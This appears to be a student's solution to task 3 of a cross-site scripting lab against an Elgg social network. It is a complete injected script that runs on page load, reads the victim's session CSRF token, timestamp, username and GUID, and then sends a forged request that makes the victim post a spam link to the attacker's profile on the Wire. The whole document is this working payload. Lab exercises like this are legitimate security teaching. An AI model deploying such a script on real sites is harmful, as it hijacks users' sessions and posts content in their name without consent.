//task 3
<script type="text/javascript">
	window.onload = function(){
	//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
	//and Security Token __elgg_token
	var ts="__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	var username=elgg.session.user.username
	var userguid=elgg.session.user.guid
	// first I visit samy's profile. I copied the profile link.Then I went to the wire.There I make a post using the text.from the network option I click on edit and respond. There I observed the request body.and copy this to postText 
	var postText="To+earn+12+USD%2FHour%28%21%29%2C%0D%0Avisit+now%3A+http%3A%2F%2Fwww.xsslabelgg.com%2Fprofile%2Fsamy"; 
	//Construct the content of your url.
        var sendurl="http://www.xsslabelgg.com/action/thewire/add"; //FILL IN
	var content=ts+token+"&body="+postText; //FILL IN
	
	if(elgg.session.user.guid!=47)
	{
		//Create and send Ajax request to modify profile
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content);
	}
	}
</script>
